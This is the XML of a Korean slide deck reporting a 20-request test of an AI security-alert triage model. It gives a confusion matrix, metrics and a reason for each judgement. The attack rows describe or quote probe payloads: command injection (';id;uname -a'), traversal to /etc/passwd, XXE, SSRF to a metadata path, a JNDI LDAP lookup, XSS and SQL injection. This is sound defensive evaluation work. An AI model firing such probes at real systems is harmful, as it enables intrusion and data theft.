Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R66cbea505eef49d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8905909fd54ef5" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="Ra5d1ffb0f18e42c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fe53b8c4d344a7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide20.xml" Id="R018d99a742014ab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06a6318b6a4b41" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide21.xml" Id="R9bd3041ad957457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bc9ca75834451a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide22.xml" Id="Rdba3b4459be0427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cc968f334a495b" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide23.xml" Id="Rba456832f989444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7d5dc14f0a4a52" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide24.xml" Id="Raf671e79d5624f4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8d2db885a44e65" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide25.xml" Id="R9c5f444269b64a1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화면 값</c:v>
          </c:tx>
          <c:dPt>
            <c:idx val="0"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326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566D7D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B45326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566D7D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B45326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B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="6"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="566D7D"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="7"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="8"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="566D7D"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="9"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="10"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="11"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="12"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="13"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="14"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="15"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="16"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="17"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="18"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="19"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:cat>
            <c:strRef>
              <c:f>'Chart Data'!$A$2:$A$21</c:f>
              <c:strCache>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>S01</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>S02</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>S03</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>S04</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>S05</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>S06</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>S07</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>S08</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>S09</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>S10</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>S11</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>S12</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>S13</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>S14</c:v>
                </c:pt>
                <c:pt idx="14">
                  <c:v>S15</c:v>
                </c:pt>
                <c:pt idx="15">
                  <c:v>S16</c:v>
                </c:pt>
                <c:pt idx="16">
                  <c:v>S17</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>S18</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>S19</c:v>
                </c:pt>
                <c:pt idx="19">
                  <c:v>S20</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>'Chart Data'!$B$2:$B$21</c:f>
              <c:numCache>
                <c:formatCode>0.00</c:formatCode>
                <c:ptCount val="20"/>
                <c:pt idx="0">
                  <c:v>0.47</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>0.39</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>0.48</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>0.3</c:v>
                </c:pt>
                <c:pt idx="4">
                  <c:v>0.31</c:v>
                </c:pt>
                <c:pt idx="5">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="6">
                  <c:v>0.35</c:v>
                </c:pt>
                <c:pt idx="7">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="8">
                  <c:v>0.27</c:v>
                </c:pt>
                <c:pt idx="9">
                  <c:v>0.65</c:v>
                </c:pt>
                <c:pt idx="10">
                  <c:v>0.43</c:v>
                </c:pt>
                <c:pt idx="11">
                  <c:v>0.46</c:v>
                </c:pt>
                <c:pt idx="12">
                  <c:v>0.37</c:v>
                </c:pt>
                <c:pt idx="13">
                  <c:v>0.67</c:v>
                </c:pt>
                <c:pt idx="14">
                  <c:v>0.51</c:v>
                </c:pt>
                <c:pt idx="15">
                  <c:v>0.6</c:v>
                </c:pt>
                <c:pt idx="16">
                  <c:v>0.63</c:v>
                </c:pt>
                <c:pt idx="17">
                  <c:v>0.45</c:v>
                </c:pt>
                <c:pt idx="18">
                  <c:v>0.57</c:v>
                </c:pt>
                <c:pt idx="19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83246"/>
                  </a:solidFill>
                  <a:latin typeface="Malgun Gothic"/>
                  <a:ea typeface="Malgun Gothic"/>
                  <a:cs typeface="Malgun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4E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</c:catAx>
      <c:valAx>
        <c:axId val="48672768"/>
        <c:scaling>
          <c:orientation val="minMax"/>
          <c:max val="1.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4EA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5F7FA"/>
        </a:solidFill>
      </c:spPr>
    </c:plotArea>
    <c:plotVisOnly val="1"/>
  </c:chart>
  <c:spPr>
    <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
      <a:srgbClr val="F5F7FA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6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84F0A1-4B27-4EEF-9D0C-D6124E7B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3868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77CEE8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77CEE8"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>eyeCloudXOAR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2DD4EB-AE47-4440-933A-12226D78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38684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5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 정오탐 탐지 모델</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="5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5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샘플로그 검증 결과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5AC645-1434-40F5-ADB1-0D5A0599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1362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C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>LogGenerator 연동 및 AI TEST 플레이북 실행 기록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E4EF19-E38B-40BB-81E3-6206319F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43675"/>
            <a:ext cx="1352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C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>테스트 기록  2026.09.08</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="2175" b="0">
                <a:solidFill>
                  <a:srgbClr val="C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>대상 서버  10.1.42.80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16272580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5F79EE-8C57-481D-B712-D02855C9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공격 10건을 탐지했고 정상 6건을 공격으로 판정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7F86F0-22C4-4167-85E1-23D7272C9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공격 의도·모사 10건, 정상 대조군 10건에 대한 사후 수동 검토 결과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A03A90-228A-4145-BA52-89C53D1A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5834F6-6BD7-48BD-9443-4E7F7F42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3338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64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70.0%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7353D2-4FAF-44C8-B4F0-535553E3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4333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전체 정확도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E5F3E4-7002-4424-AF88-DE4B71A5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4333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20건 중 14건 정분류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F6C8AB-CC0F-40D7-BF09-2F80BF98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628900"/>
            <a:ext cx="43338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defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="6450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rPr>
              <a:t>100.0%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BAFA1A-7CA6-4749-A05B-BC173F13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952875"/>
            <a:ext cx="4333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공격 탐지율 / Recall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ED8570-AED2-4923-9DC8-915521F6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4610100"/>
            <a:ext cx="4333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공격 모사 10건 중 10건 탐지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FDC25C-7C70-49CA-AFCA-989EC173E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628900"/>
            <a:ext cx="43338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defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="6450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rPr>
              <a:t>62.5%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A8558E-3467-4163-BB06-1585B84F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952875"/>
            <a:ext cx="4333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공격 판정 정밀도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AE3DBB-5C57-4ACA-A596-ACA394B2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610100"/>
            <a:ext cx="4333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공격 판정 16건 중 실제 공격 10건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47AE0F-0B3A-40E4-8E92-3DB35C262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9825"/>
            <a:ext cx="13868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rPr>
              <a:t>정상 대조군 오탐률 60.0%  (6 / 10)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ADF3A3-962F-4BFE-948C-FC35943C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77125"/>
            <a:ext cx="1386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이 수치는 제공된 20건의 결과이며, 학습·평가 데이터 분리 여부와 운영 환경의 일반화 성능은 확인되지 않았다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4169037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12574D-4614-42F6-A799-C4E7AD80C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평가 대상과 수동 분류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CE9BA9-8505-4861-8AE4-85223DBE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화면의 공격·정상 판정과 독립적인 기준으로 20개 요청을 다시 분류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77782B-AE39-4008-9152-76E47A87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87F210-35C8-4BD8-9EC7-554A820D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평가 단위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A69F27-7AA2-4E11-9442-5102A702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43150"/>
            <a:ext cx="1026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제공 순서대로 S01~S20을 부여한 HTTP 요청 20건.</a:t>
            </a:r>
          </a:p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각 요청의 화면 값과 공격·정상 판정을 그대로 비교한다.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02A58B-9D93-45AC-A890-49F03783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정상 로그 10건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FE245F-2DE1-45B6-889E-936BF3B4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14750"/>
            <a:ext cx="1026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S01~S10은 제공된 요청 범위에서 공격 구문이 없는 대조군.</a:t>
            </a:r>
          </a:p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업로드 파일 본문, 로그인 응답, 반복 행위는 확인되지 않았다.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74CF6A-45EC-45F0-BBE2-E1011385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공격 로그 10건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BC51CA-0874-4F92-8635-64D55362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86350"/>
            <a:ext cx="1026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S11~S20은 삽입, 경로 순회, 외부 접근 등을 시도·모사하는 패턴.</a:t>
            </a:r>
          </a:p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실제 취약점 악용 성공 여부는 이 자료의 평가 대상에 포함하지 않는다.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50A0B6-3635-472A-9DC3-61FAC995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96150"/>
            <a:ext cx="1386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원문 표기를 보존한다. % 인코딩, \r\n, \*, ldap\://와 Referer의 Markdown 링크 표기는 임의로 교정하지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5856104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99DB71-B2C7-45A9-BCCC-7DCAA29B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기존 테스트의 연동 과정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CD3F55-B00C-48C1-911B-65F9F0C80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사용자 설명에 따른 구성 명칭과 처리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BCE0E0-51E8-4908-A2D4-14E77722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2266950"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="4838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4286250"/>
                <a:gridCol w="8629650"/>
              </a:tblGrid>
              <a:tr h="5524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구성 요소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테스트 과정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</a:tr>
              <a:tr h="8572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LogGenerator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학습 후 판정을 확인할 샘플 로그를 선택하고 전송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02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10.1.42.80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테스트 서버의 로그 수신 경로로 전달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8572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LogGenerator 파서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수신 로그를 파싱하고 AI 입력에 필요한 payload를 추출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04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이벤트  AITEST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로그를 일반 이벤트로 연동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8572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플레이북 티켓  AI TEST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정오탐 분석을 실행하고 피드백 저장 단계로 진행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49D1D0-D63D-4EE7-A540-6E3B4BF8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77125"/>
            <a:ext cx="1386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대상 서버와 구성 명칭은 제공 내용 기준. 실제 전송 프로토콜·포트·EPS·수신 건수는 제공 자료에 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7270026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312FF5-5587-4508-953D-629F7A68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파서와 이벤트·티켓 연계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519539-AC86-4FBA-B052-133084D3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연동 이름과 분석 입력을 구분해 테스트 조건을 재현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979026-4321-4C4E-B281-70541A20C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88E251-8712-496C-8B3B-D4E477EB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6475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수신 로그 파싱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7FA9FB-FB79-4837-B9FE-53F1FA547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76475"/>
            <a:ext cx="1026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등록 이름  LogGenerator</a:t>
            </a:r>
          </a:p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HTTP 요청이 포함된 payload와 이벤트 연동 필드를 추출한다.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3EEDC8-ED89-40EA-AA2A-AB5F80DA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이벤트 및 티켓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AC92E6-B65B-4BA0-BEC2-3A96CA4B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19500"/>
            <a:ext cx="1026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일반 이벤트  AITEST</a:t>
            </a:r>
          </a:p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플레이북 티켓  AI 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988719-E5A6-49D0-B95B-656C4029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AI 분석 입력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08E115-48E3-48E5-9892-DA5BDAD0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53000"/>
            <a:ext cx="1026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티켓의 payload를 정오탐 분석 요청에 전달한다.</a:t>
            </a:r>
          </a:p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정답 라벨과 보고서용 S번호는 모델 입력에서 분리한다.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5CE21C-9575-4D78-9CCA-D384F2F8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91375"/>
            <a:ext cx="1386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파서 정규식, 장비 매핑, 이벤트 조건식, 활성 모델 버전 및 실제 입력 전문은 별도 설정 증거가 필요하다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9364995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6D33FA-A367-4CF5-A267-87E3F06E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AI TEST 플레이북 실행 화면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6C233F-75F3-4DCF-BD69-A075C835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제공 화면의 노드 이름과 자동·수동 실행 모드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5B711B-3884-4A47-B7B7-FBCA095F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67d50997274d94"/>
          <a:stretch xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:off x="733536" y="2324100"/>
            <a:ext cx="13772928" cy="1847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EC7B70-83DB-44E4-9080-103E54D4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6429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정오탐 분석 요청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1B65C8-B2E9-46A6-964A-BB0DC222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64293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Auto</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="23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분석 요청을 자동 실행하는 노드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C29AAC-B159-4ACA-8C54-F1EF485A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95825"/>
            <a:ext cx="655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rPr>
              <a:t>정오탐 피드백 데이터 저장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9E1A4-E1CE-4AFC-A6C2-BE112ECCE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334000"/>
            <a:ext cx="65532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Manual</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="23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사용자 피드백을 처리하는 수동 단계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ABCE26-88AB-4C44-B0F6-07258042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58050"/>
            <a:ext cx="1386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티켓에는 이 단계의 상태가 표시된다. 제공 화면과 목록만으로 피드백 저장 완료 또는 End 도달을 확정할 수 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19919638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FA49DE-1684-4A2F-B00A-552C360D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AI TEST 티켓 20건의 실행 기록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CB71F3-6741-4FF6-8458-A3DFC640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2026.09.08  /  공통 담당자: 미지정  /  상태: 분석/대응 ( 정오탐 피드백 데이터 저장 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0CFB2B-5BA8-46C2-BF8B-83CB96C1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B0011F-596A-4034-AA2D-DB69517A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676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제공 목록 A   14:18:13 ~ 14:19:07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8F9DDD-40A7-4CD4-9398-ACB2F9A6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43125"/>
            <a:ext cx="662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제공 목록 B   16:54:54 ~ 16:55:39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85800" y="2781300"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="6667500" cy="4438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1714500"/>
              </a:tblGrid>
              <a:tr h="4381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 ID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시각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</a:tr>
              <a:tr h="4000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SR260908-AW1-00000380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14:19:07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SR260908-AW1-00000379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14:18:58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4000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SR260908-AW1-00000378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14:18:58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SR260908-AW1-00000377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14:18:40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4000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SR260908-AW1-00000376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14:18:40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SR260908-AW1-00000375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14:18:40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4000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SR260908-AW1-00000374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14:18:22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SR260908-AW1-00000373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14:18:22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4000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SR260908-AW1-00000372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14:18:22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SR260908-AW1-00000371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14:18:13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"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" x="7924800" y="2781300"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="6629400" cy="4438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14900"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="4381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 ID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시각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</a:tr>
              <a:tr h="4000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SR260908-AW1-00000456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16:55:39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SR260908-AW1-00000455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16:55:39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4000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SR260908-AW1-00000454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16:55:39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SR260908-AW1-00000452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16:55:21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4000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SR260908-AW1-00000451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16:55:21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SR260908-AW1-00000450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16:55:21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4000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SR260908-AW1-00000449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16:55:12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SR260908-AW1-00000448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16:55:12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4000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SR260908-AW1-00000447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16:55:12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SR260908-AW1-00000446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16:54:54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791E8C-5716-4AF3-B507-208C7347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77125"/>
            <a:ext cx="1386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티켓과 개별 로그의 1:1 대응은 미제공. 목록 B의 00000453 미표시만으로 수집 누락이나 실행 실패를 판단하지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6235134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ADA402-D122-4D28-BA80-9E0207E9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혼동행렬과 성능 지표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00CFA4-AA94-4197-8DD3-FFD4989F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양성 클래스 = 공격 의도·모사 로그  /  정답 = 본 보고서의 수동 분류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8C9637-0B87-4E88-9A3F-50C8DA1B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85800" y="2571750"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="66675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1714500"/>
                <a:gridCol w="1714500"/>
                <a:gridCol w="1333500"/>
              </a:tblGrid>
              <a:tr h="619125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수동 분류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 공격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 정상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합계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</a:tr>
              <a:tr h="10477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TP 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FN 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FP 6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TN 4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714375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합계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"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" x="8020050" y="2352675"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="65341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1714500"/>
                <a:gridCol w="1866900"/>
              </a:tblGrid>
              <a:tr h="5524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지표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계산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</a:tr>
              <a:tr h="657225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전체 정확도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 / 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70.0%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 탐지율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 / 10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100.0%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657225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 판정 정밀도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 / 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62.5%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 오탐률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 / 10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60.0%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657225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 판별률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 / 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40.0%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F1 점수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 / 26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76.9%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4D1568-9E9E-43D9-ADD8-4149BECF9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77125"/>
            <a:ext cx="1386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FP: 정상 로그를 공격으로 판정한 6건. FN: 공격 로그를 정상으로 판정한 건수는 이번 표본에서 0건.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4260352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73004F-622A-4694-86D4-34198257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정상 로그 판정 근거  S01~S05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ED5C59-1FF9-48B9-B424-C7290FCE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수동 정상 5건 중 모델 오탐 3건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B4FBFD-07E5-47F6-9F9A-C0CA1181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2286000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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 값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수동 분류 근거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S01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상대경로 리디렉션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B45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/home으로 이동하는 상대경로이며 외부 URL이나 헤더 삽입이 없다.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S02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 업로드 발췌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0.39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566D7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TN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이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.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S03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로그인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B45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삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을 확정할 수 없다.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S04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 점검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0.30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566D7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TN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/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.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S05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JSON 검색 조건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B45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union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이 아니다.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61765E-38C0-4634-8F4C-856646D3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77125"/>
            <a:ext cx="1386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정상 = 제공된 요청 범위에서 공격 근거가 없는 대조 로그. 파일 내용·권한·응답까지 검증한 판정은 아님.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7988461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863FD7-B02B-4981-B126-7E1CB410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정상 로그 판정 근거  S06~S10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694C23-DF1C-4459-923F-E850EBD9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수동 정상 5건 중 모델 오탐 3건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C047E3-2A88-44FE-B378-F8E799C9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2286000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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 값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수동 분류 근거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S06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 ping 요청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B45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localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이 없다.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S07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파일 다운로드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0.35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566D7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TN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파일명 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.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S08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기술 문서 검색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B45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HTML script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가 없다.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S09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자연어 검색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0.27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566D7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TN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건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.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상품 목록 조회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B45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상품 ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석 삽입이 없다.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8B7EEE-0138-4428-815B-B317119E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77125"/>
            <a:ext cx="1386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정상 = 제공된 요청 범위에서 공격 근거가 없는 대조 로그. 파일 내용·권한·응답까지 검증한 판정은 아님.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19595705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3986A3-732E-4C3B-9A96-CF31B874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공격 로그 판정 근거  S11~S15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658A2A-E403-444F-BB07-17881206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공격 의도·모사 기준 5건 모두 공격으로 판정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331FB1-0155-4A5D-9EBF-FE43B2F5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2286000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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 값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수동 분류 근거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CRLF / 헤더 삽입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87C7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%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는 삽입 탐침이다.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S12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XML 외부 엔터티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0.46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87C7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TP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디코딩 시 DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.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S13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 템플릿 삽입 모사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87C7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중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이 필요하다.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S14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SSRF 모사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0.67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87C7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TP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URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.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S15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Log4Shell 패턴 모사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0.51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87C7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User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.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25EEDD-4639-4346-9685-5E625AB5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77125"/>
            <a:ext cx="1386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공격 = 공격 의도·모사 패턴 기준. 취약점 존재, 서버 실행 또는 침해 성공을 의미하지 않음.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="141693263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FD5A7F-E410-479E-99BC-BEF505C8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공격 로그 판정 근거  S16~S20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871464-FDE8-4BB0-9AB8-5B39CD226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공격 삽입·경로 순회 패턴 5건 모두 공격으로 판정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0B3DF2-DC81-4DB8-AE79-8DACB8313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2286000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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 값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수동 분류 근거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OS 명령 삽입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87C7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디코딩 시 ;id;uname -a를 연결해 추가 OS 명령 실행을 시도한다.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S17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경로 순회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0.63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87C7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TP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반복 ../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.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S18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XSS 삽입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87C7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디코딩 시 &lt;script&gt;alert(1)&lt;/script&gt;를 포함하는 스크립트 삽입 탐침이다.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S19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 지연 SQL 삽입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0.57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87C7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TP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인용부호 종료, AND SLEEP(5), 주석을 조합한 시간 지연형 SQL 삽입이다.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UNION SQL 삽입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87C7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UNION SELECT로 users 테이블의 username과 password 조회를 시도한다.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981F2F-9604-444E-B1C5-7283F2D8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77125"/>
